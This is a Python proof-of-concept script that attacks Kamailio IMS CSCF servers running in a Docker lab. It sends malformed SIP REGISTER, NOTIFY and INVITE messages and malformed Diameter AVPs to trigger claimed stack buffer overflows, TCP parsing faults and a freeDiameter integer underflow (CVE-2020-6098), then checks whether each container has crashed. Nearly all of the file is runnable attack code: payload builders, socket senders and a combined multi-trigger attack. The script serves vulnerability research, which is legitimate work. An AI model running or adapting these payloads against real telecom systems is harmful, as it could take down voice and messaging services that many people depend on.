#!/usr/bin/env python3
"""
Advanced Kamailio IMS CSCF PoC Collection - Source Code Analysis Based
======================================================================
Based on deep source code analysis of Kamailio 6.1 branch.

Confirmed Vulnerabilities:
1. save.c:229   - Stack buffer overflow via alias port (portbuf[5])
2. notify.c:178 - Stack buffer overflow via alias port (bufport[5])
3. service_routes.c:506 - Buffer overflow via Route URI (routes[10][255])
4. ipsec.c - string_to_key with oversized ik/ck
5. TCP processing - CVE-2026-39863 pattern (out-of-bounds via TCP)
6. freeDiameter AVP - CVE-2020-6098 integer underflow on Cx interface
7. SIP parser edge cases per RFC 3261

Target: Kamailio 6.1.3 IMS CSCF
"""

import socket
import struct
import subprocess
import time
import sys
import argparse

PCSCF_IP = "172.22.0.21"
PCSCF_PORT = 5060
ICSCF_IP = "172.22.0.19"
ICSCF_PORT = 4060
SCSCF_IP = "172.22.0.20"
SCSCF_PORT = 6060

# Diameter ports
ICSCF_CX_PORT = 3869
SCSCF_CX_PORT = 3870
PCSCF_RX_PORT = 3871

UE_IP = "172.29.0.18"
UE_PORT = 5060
DOMAIN = "ims.mnc001.mcc001.3gppnetwork.org"
IMSI = "001010000000001"


def check_container(name):
    result = subprocess.run(
        ['docker', 'inspect', '-f', '{{.State.Running}}', name],
        capture_output=True, text=True
    )
    return result.stdout.strip() == 'true'


def send_sip(msg, target_ip, target_port, proto='udp', timeout=3):
    try:
        if proto == 'udp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(msg.encode() if isinstance(msg, str) else msg,
                       (target_ip, target_port))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target_ip, target_port))
            sock.send(msg.encode() if isinstance(msg, str) else msg)
        try:
            data = sock.recv(65535)
            return data.decode(errors='ignore')
        except socket.timeout:
            return None
        finally:
            sock.close()
    except Exception as e:
        return str(e)


def send_raw_tcp(data, target_ip, target_port, timeout=3):
    """Send raw binary data over TCP"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target_ip, target_port))
        sock.send(data)
        try:
            resp = sock.recv(65535)
            return resp
        except socket.timeout:
            return None
        finally:
            sock.close()
    except Exception as e:
        return str(e)


class AdvancedPoC:
    def __init__(self):
        self.results = []

    def log(self, msg):
        print(f"[*] {msg}")

    def record(self, vuln, target, crashed, details=""):
        self.results.append({
            'vuln': vuln,
            'target': target,
            'crashed': crashed,
            'details': details
        })
        status = "CRASHED" if crashed else "no crash"
        print(f"    Result: {status}")

    # ========================================================================
    # VULN-1: save.c:229 Stack Buffer Overflow via alias port
    # ========================================================================
    def test_alias_port_overflow(self, target_ip, target_port, target_name):
        """
        save.c line 229: memcpy(portbuf, port_s, (p - port_s))
        portbuf is char[5] - only 5 bytes on stack
        If the port part of alias=HOST~PORT~PROTO is > 5 chars,
        it overflows portbuf and overwrites adjacent stack variables.

        Stack layout after portbuf:
          str alias_s (16 bytes: ptr + int)
          char srcip[50]
        """
        self.log(f"VULN-1: alias port overflow (save.c:229) -> {target_name}")

        call_id = f"alias-overflow-{int(time.time())}@{UE_IP}"

        # Different overflow sizes to maximize chance of crash
        port_overflows = [
            ("6_bytes", "A" * 6),        # Just past portbuf
            ("10_bytes", "B" * 10),       # Overflow into alias_s
            ("20_bytes", "C" * 20),       # Deep into alias_s
            ("50_bytes", "D" * 50),       # Into srcip
            ("100_bytes", "E" * 100),     # Way past srcip
            ("200_bytes", "F" * 200),     # Massive overflow
            ("valid_port_6", "123456"),   # 6-char valid port number
            ("large_port", "99999999"),   # Large numeric port
        ]

        for name, port_str in port_overflows:
            alias_value = f"{UE_IP}~{port_str}~1"

            msg = (
                f"REGISTER sip:{DOMAIN} SIP/2.0\r\n"
                f"Via: SIP/2.0/UDP {UE_IP}:{UE_PORT};branch=z9hG4bK-alias-{name}\r\n"
                f"From: <sip:{IMSI}@{DOMAIN}>;tag=alias-{name}\r\n"
                f"To: <sip:{IMSI}@{DOMAIN}>\r\n"
                f"Call-ID: {call_id}\r\n"
                f"CSeq: 1 REGISTER\r\n"
                f"Contact: <sip:{IMSI}@{UE_IP}:{UE_PORT};alias={alias_value}>\r\n"
                f"Expires: 3600\r\n"
                f"Content-Length: 0\r\n\r\n"
            )

            print(f"  Variant: {name} (port_len={len(port_str)})")
            resp = send_sip(msg, target_ip, target_port)
            time.sleep(0.5)

            if not check_container(target_name):
                self.record("VULN-1-alias-port", target_name, True, name)
                return True

            if resp:
                status_line = resp.split('\r\n')[0] if resp else "None"
                print(f"    Response: {status_line[:60]}")

        self.record("VULN-1-alias-port", target_name, False)
        return False

    # ========================================================================
    # VULN-2: notify.c:178 Stack Buffer Overflow via alias port
    # ========================================================================
    def test_notify_alias_overflow(self, target_ip, target_port, target_name):
        """
        notify.c line 178: memcpy(bufport, port, received_port_len)
        bufport is char[5] - only 5 bytes
        received_port_len is attacker-controlled via alias in Contact
        """
        self.log(f"VULN-2: notify alias overflow (notify.c:178) -> {target_name}")

        # NOTIFY with crafted Contact containing alias with long port
        port_overflows = [
            ("notify_10B", "N" * 10),
            ("notify_50B", "N" * 50),
            ("notify_100B", "N" * 100),
        ]

        for name, port_str in port_overflows:
            alias_value = f"{UE_IP}~{port_str}~1"

            msg = (
                f"NOTIFY sip:{IMSI}@{UE_IP}:{UE_PORT} SIP/2.0\r\n"
                f"Via: SIP/2.0/UDP {target_ip}:{target_port};branch=z9hG4bK-notify-{name}\r\n"
                f"From: <sip:{IMSI}@{DOMAIN}>;tag=notify-{name}\r\n"
                f"To: <sip:{IMSI}@{DOMAIN}>\r\n"
                f"Call-ID: notify-{int(time.time())}@{target_ip}\r\n"
                f"CSeq: 1 NOTIFY\r\n"
                f"Contact: <sip:{IMSI}@{UE_IP}:{UE_PORT};alias={alias_value}>\r\n"
                f"Event: reg\r\n"
                f"Subscription-State: active\r\n"
                f"Content-Length: 0\r\n\r\n"
            )

            print(f"  Variant: {name} (port_len={len(port_str)})")
            send_sip(msg, target_ip, target_port)
            time.sleep(0.5)

            if not check_container(target_name):
                self.record("VULN-2-notify-alias", target_name, True, name)
                return True

        self.record("VULN-2-notify-alias", target_name, False)
        return False

    # ========================================================================
    # VULN-3: service_routes.c:506 Buffer Overflow via Route URI
    # ========================================================================
    def test_route_uri_overflow(self, target_ip, target_port, target_name):
        """
        service_routes.c line 506:
        memcpy(routes[i], r->nameaddr.uri.s, r->nameaddr.uri.len)
        routes is char[MAXROUTES][MAXROUTESIZE] = char[10][255]
        - If uri.len > 255, overflows routes[i]
        - If more than 10 Route headers, overflows routes[] array
        """
        self.log(f"VULN-3: Route URI overflow (service_routes.c:506) -> {target_name}")

        # Long URI in Route header
        long_uri = f"sip:{'A' * 300}@{DOMAIN}"

        # Test with long URI
        msg1 = (
            f"INVITE sip:{IMSI}@{DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:{UE_PORT};branch=z9hG4bK-route-long\r\n"
            f"From: <sip:{IMSI}@{DOMAIN}>;tag=route-long\r\n"
            f"To: <sip:{IMSI}@{DOMAIN}>\r\n"
            f"Call-ID: route-long-{int(time.time())}@{UE_IP}\r\n"
            f"CSeq: 1 INVITE\r\n"
            f"Route: <{long_uri}>\r\n"
            f"Content-Length: 0\r\n\r\n"
        )

        print(f"  Variant: long_route_uri (uri_len={len(long_uri)})")
        send_sip(msg1, target_ip, target_port)
        time.sleep(0.5)
        if not check_container(target_name):
            self.record("VULN-3-route-uri", target_name, True, "long_uri")
            return True

        # Test with many Route headers (> MAXROUTES=10)
        routes = ""
        for i in range(15):
            routes += f"Route: <sip:route{i}@{DOMAIN}>\r\n"

        msg2 = (
            f"INVITE sip:{IMSI}@{DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:{UE_PORT};branch=z9hG4bK-route-many\r\n"
            f"From: <sip:{IMSI}@{DOMAIN}>;tag=route-many\r\n"
            f"To: <sip:{IMSI}@{DOMAIN}>\r\n"
            f"Call-ID: route-many-{int(time.time())}@{UE_IP}\r\n"
            f"CSeq: 1 INVITE\r\n"
            f"{routes}"
            f"Content-Length: 0\r\n\r\n"
        )

        print(f"  Variant: many_routes (15 route headers)")
        send_sip(msg2, target_ip, target_port)
        time.sleep(0.5)
        if not check_container(target_name):
            self.record("VULN-3-route-uri", target_name, True, "many_routes")
            return True

        # Combined: many routes with long URIs
        routes_long = ""
        for i in range(15):
            routes_long += f"Route: <sip:{'X' * 300}@{DOMAIN};lr>\r\n"

        msg3 = (
            f"INVITE sip:{IMSI}@{DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:{UE_PORT};branch=z9hG4bK-route-both\r\n"
            f"From: <sip:{IMSI}@{DOMAIN}>;tag=route-both\r\n"
            f"To: <sip:{IMSI}@{DOMAIN}>\r\n"
            f"Call-ID: route-both-{int(time.time())}@{UE_IP}\r\n"
            f"CSeq: 1 INVITE\r\n"
            f"{routes_long}"
            f"Content-Length: 0\r\n\r\n"
        )

        print(f"  Variant: many_long_routes (15 x 300-char URIs)")
        send_sip(msg3, target_ip, target_port)
        time.sleep(0.5)
        if not check_container(target_name):
            self.record("VULN-3-route-uri", target_name, True, "many_long")
            return True

        self.record("VULN-3-route-uri", target_name, False)
        return False

    # ========================================================================
    # VULN-4: TCP-based attacks (CVE-2026-39863 pattern)
    # ========================================================================
    def test_tcp_attacks(self, target_ip, target_port, target_name):
        """
        CVE-2026-39863: Out-of-bounds access via TCP
        Testing various malformed TCP data patterns
        """
        self.log(f"VULN-4: TCP attacks (CVE-2026-39863 pattern) -> {target_name}")

        variants = [
            # Empty TCP packet
            ("empty", b""),
            # Single byte
            ("single_byte", b"\x00"),
            # Just CRLF
            ("crlf_only", b"\r\n"),
            # Truncated SIP request
            ("truncated", b"INVITE sip:"),
            # Content-Length mismatch - body shorter than declared
            ("cl_short_body",
             b"INVITE sip:test SIP/2.0\r\n"
             b"Via: SIP/2.0/TCP 127.0.0.1\r\n"
             b"To: <sip:test>\r\n"
             b"From: <sip:test>;tag=1\r\n"
             b"Call-ID: tcp1\r\n"
             b"CSeq: 1 INVITE\r\n"
             b"Content-Length: 100\r\n\r\n"
             b"short"),
            # Content-Length = 0 but with body
            ("cl0_with_body",
             b"INVITE sip:test SIP/2.0\r\n"
             b"Via: SIP/2.0/TCP 127.0.0.1\r\n"
             b"To: <sip:test>\r\n"
             b"From: <sip:test>;tag=1\r\n"
             b"Call-ID: tcp2\r\n"
             b"CSeq: 1 INVITE\r\n"
             b"Content-Length: 0\r\n\r\n"
             b"UNEXPECTED_BODY_DATA"),
            # Negative Content-Length
            ("negative_cl",
             b"INVITE sip:test SIP/2.0\r\n"
             b"Via: SIP/2.0/TCP 127.0.0.1\r\n"
             b"To: <sip:test>\r\n"
             b"From: <sip:test>;tag=1\r\n"
             b"Call-ID: tcp3\r\n"
             b"CSeq: 1 INVITE\r\n"
             b"Content-Length: -1\r\n\r\n"),
            # Huge Content-Length
            ("huge_cl",
             b"INVITE sip:test SIP/2.0\r\n"
             b"Via: SIP/2.0/TCP 127.0.0.1\r\n"
             b"To: <sip:test>\r\n"
             b"From: <sip:test>;tag=1\r\n"
             b"Call-ID: tcp4\r\n"
             b"CSeq: 1 INVITE\r\n"
             b"Content-Length: 999999999\r\n\r\n"),
            # Multiple pipelined requests with truncation
            ("pipelined_truncated",
             b"INVITE sip:test SIP/2.0\r\n"
             b"Via: SIP/2.0/TCP 127.0.0.1\r\n"
             b"To: <sip:test>\r\n"
             b"From: <sip:test>;tag=1\r\n"
             b"Call-ID: tcp5\r\n"
             b"CSeq: 1 INVITE\r\n"
             b"Content-Length: 0\r\n\r\n"
             b"REGI"),  # Truncated second request
            # Binary garbage
            ("binary_garbage", bytes(range(256)) * 4),
            # Valid SIP over TCP
            ("valid_tcp",
             f"REGISTER sip:{DOMAIN} SIP/2.0\r\n"
             f"Via: SIP/2.0/TCP {UE_IP}:{UE_PORT};branch=z9hG4bK-tcp\r\n"
             f"From: <sip:{IMSI}@{DOMAIN}>;tag=tcp\r\n"
             f"To: <sip:{IMSI}@{DOMAIN}>\r\n"
             f"Call-ID: tcp-{int(time.time())}@{UE_IP}\r\n"
             f"CSeq: 1 REGISTER\r\n"
             f"Contact: <sip:{IMSI}@{UE_IP}:{UE_PORT};transport=tcp>\r\n"
             f"Expires: 3600\r\n"
             f"Content-Length: 0\r\n\r\n".encode()),
        ]

        for name, data in variants:
            print(f"  Variant: {name}")
            if isinstance(data, str):
                data = data.encode()
            resp = send_raw_tcp(data, target_ip, target_port)
            time.sleep(0.5)
            if not check_container(target_name):
                self.record("VULN-4-tcp", target_name, True, name)
                return True
            if resp:
                print(f"    Response: {str(resp[:60])}")

        self.record("VULN-4-tcp", target_name, False)
        return False

    # ========================================================================
    # VULN-5: SIP Parser Edge Cases (RFC 3261 compliance issues)
    # ========================================================================
    def test_sip_parser_edge_cases(self, target_ip, target_port, target_name):
        """
        RFC 3261 Section 7.3.1 - Header Field Format
        Testing edge cases that could cause parser issues
        """
        self.log(f"VULN-5: SIP parser edge cases -> {target_name}")

        variants = [
            # Header with only whitespace
            ("whitespace_header",
             "INVITE sip:test SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:test>\r\n"
             "From: <sip:test>;tag=1\r\n"
             "Call-ID: edge1\r\n"
             "CSeq: 1 INVITE\r\n"
             "X-Empty: \r\n"
             "Content-Length: 0\r\n\r\n"),

            # Folded header (continuation line)
            ("folded_header",
             "INVITE sip:test SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:test>\r\n"
             "From: <sip:test>\r\n"
             " ;tag=fold\r\n"  # Continuation of From
             "Call-ID: edge2\r\n"
             "CSeq: 1 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            # Header name with no value (just colon)
            ("colon_only_header",
             "INVITE sip:test SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:test>\r\n"
             "From: <sip:test>;tag=1\r\n"
             "Call-ID: edge3\r\n"
             "CSeq: 1 INVITE\r\n"
             "X-Test:\r\n"
             "Content-Length: 0\r\n\r\n"),

            # Multiple colons in header value
            ("multi_colon",
             "INVITE sip:test SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:test>\r\n"
             "From: <sip:test>;tag=1\r\n"
             "Call-ID: edge4\r\n"
             "CSeq: 1 INVITE\r\n"
             "Authorization: Digest username=\"a:b:c\", realm=\"d:e\"\r\n"
             "Content-Length: 0\r\n\r\n"),

            # Extremely long header name
            ("long_header_name",
             "INVITE sip:test SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:test>\r\n"
             "From: <sip:test>;tag=1\r\n"
             "Call-ID: edge5\r\n"
             "CSeq: 1 INVITE\r\n"
             f"{'X' * 10000}: value\r\n"
             "Content-Length: 0\r\n\r\n"),

            # Request-URI with special characters
            ("special_uri_chars",
             "INVITE sip:user%00@host SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:test>\r\n"
             "From: <sip:test>;tag=1\r\n"
             "Call-ID: edge6\r\n"
             "CSeq: 1 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            # Method with special characters
            ("special_method",
             "INVI\x7fTE sip:test SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:test>\r\n"
             "From: <sip:test>;tag=1\r\n"
             "Call-ID: edge7\r\n"
             "CSeq: 1 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            # SIP version variations
            ("sip_3_0",
             "INVITE sip:test SIP/3.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:test>\r\n"
             "From: <sip:test>;tag=1\r\n"
             "Call-ID: edge8\r\n"
             "CSeq: 1 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            # Missing SIP version
            ("no_version",
             "INVITE sip:test\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:test>\r\n"
             "From: <sip:test>;tag=1\r\n"
             "Call-ID: edge9\r\n"
             "CSeq: 1 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            # Extra whitespace in request line
            ("extra_ws_request_line",
             "INVITE  sip:test  SIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:test>\r\n"
             "From: <sip:test>;tag=1\r\n"
             "Call-ID: edge10\r\n"
             "CSeq: 1 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            # Tab-separated request line
            ("tab_request_line",
             "INVITE\tsip:test\tSIP/2.0\r\n"
             "Via: SIP/2.0/UDP 127.0.0.1\r\n"
             "To: <sip:test>\r\n"
             "From: <sip:test>;tag=1\r\n"
             "Call-ID: edge11\r\n"
             "CSeq: 1 INVITE\r\n"
             "Content-Length: 0\r\n\r\n"),

            # LF-only line endings (no CR)
            ("lf_only",
             "INVITE sip:test SIP/2.0\n"
             "Via: SIP/2.0/UDP 127.0.0.1\n"
             "To: <sip:test>\n"
             "From: <sip:test>;tag=1\n"
             "Call-ID: edge12\n"
             "CSeq: 1 INVITE\n"
             "Content-Length: 0\n\n"),

            # CR-only line endings (no LF)
            ("cr_only",
             "INVITE sip:test SIP/2.0\r"
             "Via: SIP/2.0/UDP 127.0.0.1\r"
             "To: <sip:test>\r"
             "From: <sip:test>;tag=1\r"
             "Call-ID: edge13\r"
             "CSeq: 1 INVITE\r"
             "Content-Length: 0\r\r"),
        ]

        for name, msg in variants:
            print(f"  Variant: {name}")
            send_sip(msg, target_ip, target_port)
            time.sleep(0.3)
            if not check_container(target_name):
                self.record("VULN-5-parser", target_name, True, name)
                return True

        self.record("VULN-5-parser", target_name, False)
        return False

    # ========================================================================
    # VULN-6: Diameter Cx interface attack (CVE-2020-6098 pattern)
    # ========================================================================
    def test_diameter_cx_attack(self, target_ip, target_port, target_name):
        """
        CVE-2020-6098: Integer underflow in freeDiameter AVP parsing
        avp_rawlen = avp_len - GETAVPHDRSZ(flags)
        When avp_len=0 and header size=8, underflow to 4294967288

        Diameter message format:
        - 4 bytes: Version(1) + Message Length(3)
        - 4 bytes: Flags + Command Code
        - 4 bytes: Application-ID
        - 4 bytes: Hop-by-Hop ID
        - 4 bytes: End-to-End ID
        - AVPs
        """
        self.log(f"VULN-6: Diameter AVP integer underflow -> {target_name}:{target_port}")

        def build_diameter_msg(avp_data):
            """Build a Diameter message with malicious AVP"""
            # Diameter header
            version = 1
            flags = 0x80  # Request flag
            cmd_code = 257  # Capabilities-Exchange (CER)
            app_id = 0
            hbh_id = 0x12345678
            ete_id = 0x87654321

            msg_body = avp_data
            msg_len = 20 + len(msg_body)  # 20 = header size

            header = struct.pack('!B', version)
            header += struct.pack('!I', msg_len)[1:]  # 3 bytes
            header += struct.pack('!B', flags)
            header += struct.pack('!I', cmd_code)[1:]  # 3 bytes
            header += struct.pack('!I', app_id)
            header += struct.pack('!I', hbh_id)
            header += struct.pack('!I', ete_id)

            return header + msg_body

        def build_malicious_avp(code, flags, length, vendor_id=None, data=b''):
            """Build a malicious AVP with integer underflow"""
            avp = struct.pack('!I', code)  # AVP Code
            avp += struct.pack('!B', flags)  # AVP Flags
            avp += struct.pack('!I', length)[1:]  # AVP Length (3 bytes)
            if vendor_id is not None and (flags & 0x80):  # V-bit set
                avp += struct.pack('!I', vendor_id)
            avp += data
            return avp

        variants = []

        # Variant 1: AVP with length=0 (integer underflow)
        # avp_rawlen = 0 - 8 = 4294967288 (unsigned)
        avp1 = build_malicious_avp(code=263, flags=0x40, length=0)
        variants.append(("avp_len_0", build_diameter_msg(avp1)))

        # Variant 2: AVP with length < header size
        avp2 = build_malicious_avp(code=263, flags=0x40, length=4)
        variants.append(("avp_len_4", build_diameter_msg(avp2)))

        # Variant 3: AVP with length=8 (header size, no data)
        avp3 = build_malicious_avp(code=263, flags=0x40, length=8)
        variants.append(("avp_len_8", build_diameter_msg(avp3)))

        # Variant 4: AVP with huge length
        avp4 = build_malicious_avp(code=263, flags=0x40, length=0xFFFFFF)
        variants.append(("avp_huge_len", build_diameter_msg(avp4)))

        # Variant 5: AVP with V-bit set but length too small for vendor ID
        avp5 = build_malicious_avp(code=263, flags=0xC0, length=10)
        variants.append(("avp_vbit_small", build_diameter_msg(avp5)))

        # Variant 6: Multiple AVPs with one malicious
        avp6_ok = build_malicious_avp(code=264, flags=0x40, length=12,
                                       data=b'test')
        avp6_bad = build_malicious_avp(code=263, flags=0x40, length=0)
        variants.append(("multi_avp", build_diameter_msg(avp6_ok + avp6_bad)))

        # Variant 7: 16 null bytes as AVP payload (from Talos advisory)
        avp7 = build_malicious_avp(code=0, flags=0, length=0,
                                    data=b'\x00' * 16)
        variants.append(("null_16_bytes", build_diameter_msg(avp7)))

        for name, data in variants:
            print(f"  Variant: {name}")
            resp = send_raw_tcp(data, target_ip, target_port)
            time.sleep(0.5)
            if not check_container(target_name):
                self.record("VULN-6-diameter", target_name, True, name)
                return True
            if resp:
                print(f"    Response ({len(resp)} bytes): {resp[:40].hex()}")

        self.record("VULN-6-diameter", target_name, False)
        return False

    # ========================================================================
    # VULN-7: Combined alias + Route + TCP attack
    # ========================================================================
    def test_combined_attack(self, target_ip, target_port, target_name):
        """Combined attack using multiple vulnerability triggers"""
        self.log(f"VULN-7: Combined attack -> {target_name}")

        # Alias overflow + many routes + long URIs, over TCP
        long_port = "Z" * 100
        alias_value = f"{UE_IP}~{long_port}~1"

        routes = ""
        for i in range(15):
            routes += f"Route: <sip:{'Y' * 300}@{DOMAIN};lr>\r\n"

        msg = (
            f"REGISTER sip:{DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/TCP {UE_IP}:{UE_PORT};branch=z9hG4bK-combined\r\n"
            f"Via: SIP/2.0/UDP :]\r\n"  # CVE-2018-16657 trigger
            f"From: <sip:{IMSI}@{DOMAIN}>;tag=\r\n"  # Empty tag
            f"To: <sip:{IMSI}@{DOMAIN}>\r\n"
            f"To: <sip:{IMSI}@{DOMAIN}>;tag=\r\n"  # CVE-2018-14767 trigger
            f"Call-ID: combined-{int(time.time())}@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"CSeq: 2 REGISTER\r\n"  # CVE-2020-27507 trigger
            f"Contact: <sip:{IMSI}@{UE_IP}:{UE_PORT};alias={alias_value}>\r\n"
            f"{routes}"
            f"Expires: 3600\r\n"
            f"Content-Length: 0\r\n\r\n"
        )

        print(f"  Sending combined attack (TCP)")
        send_raw_tcp(msg.encode(), target_ip, target_port)
        time.sleep(1)

        print(f"  Sending combined attack (UDP)")
        send_sip(msg, target_ip, target_port)
        time.sleep(1)

        crashed = not check_container(target_name)
        self.record("VULN-7-combined", target_name, crashed)
        return crashed


def main():
    parser = argparse.ArgumentParser(description='Advanced Kamailio IMS PoC')
    parser.add_argument('--target', choices=['pcscf', 'icscf', 'scscf', 'all'],
                        default='pcscf', help='Target CSCF')
    parser.add_argument('--vuln', default='all',
                        help='Vulnerability to test (1-7) or "all"')
    args = parser.parse_args()

    print("=" * 70)
    print("Advanced Kamailio IMS CSCF PoC - Source Code Analysis Based")
    print("=" * 70)

    sip_targets = {
        'pcscf': (PCSCF_IP, PCSCF_PORT, 'pcscf'),
        'icscf': (ICSCF_IP, ICSCF_PORT, 'icscf'),
        'scscf': (SCSCF_IP, SCSCF_PORT, 'scscf'),
    }

    diameter_targets = {
        'pcscf': (PCSCF_IP, PCSCF_RX_PORT, 'pcscf'),
        'icscf': (ICSCF_IP, ICSCF_CX_PORT, 'icscf'),
        'scscf': (SCSCF_IP, SCSCF_CX_PORT, 'scscf'),
    }

    if args.target == 'all':
        target_list = sip_targets.keys()
    else:
        target_list = [args.target]

    poc = AdvancedPoC()

    for tname in target_list:
        sip_ip, sip_port, cname = sip_targets[tname]
        dia_ip, dia_port, _ = diameter_targets[tname]

        print(f"\n{'=' * 60}")
        print(f"Target: {cname} (SIP: {sip_ip}:{sip_port}, Diameter: {dia_ip}:{dia_port})")
        print(f"{'=' * 60}")

        tests = [
            ("1", lambda: poc.test_alias_port_overflow(sip_ip, sip_port, cname)),
            ("2", lambda: poc.test_notify_alias_overflow(sip_ip, sip_port, cname)),
            ("3", lambda: poc.test_route_uri_overflow(sip_ip, sip_port, cname)),
            ("4", lambda: poc.test_tcp_attacks(sip_ip, sip_port, cname)),
            ("5", lambda: poc.test_sip_parser_edge_cases(sip_ip, sip_port, cname)),
            ("6", lambda: poc.test_diameter_cx_attack(dia_ip, dia_port, cname)),
            ("7", lambda: poc.test_combined_attack(sip_ip, sip_port, cname)),
        ]

        for vuln_id, test_func in tests:
            if args.vuln == 'all' or args.vuln == vuln_id:
                try:
                    if test_func():
                        print(f"\n*** CRASH DETECTED on {cname} ***")
                        print(f"Restarting {cname}...")
                        subprocess.run(['docker', 'restart', cname],
                                      capture_output=True)
                        time.sleep(10)
                except Exception as e:
                    print(f"Error: {e}")
                time.sleep(1)

    # Summary
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)

    crashes = [r for r in poc.results if r['crashed']]
    if crashes:
        print(f"\nCrashes detected: {len(crashes)}")
        for c in crashes:
            print(f"  - {c['vuln']} on {c['target']}: {c['details']}")
    else:
        print("\nNo crashes detected.")
        print("Kamailio 6.1.3 appears to handle these malformed inputs gracefully.")
        print("The save.c alias overflow may need the full registration flow.")
        print("The Diameter attacks need direct access to Cx/Rx ports.")


if __name__ == '__main__':
    main()
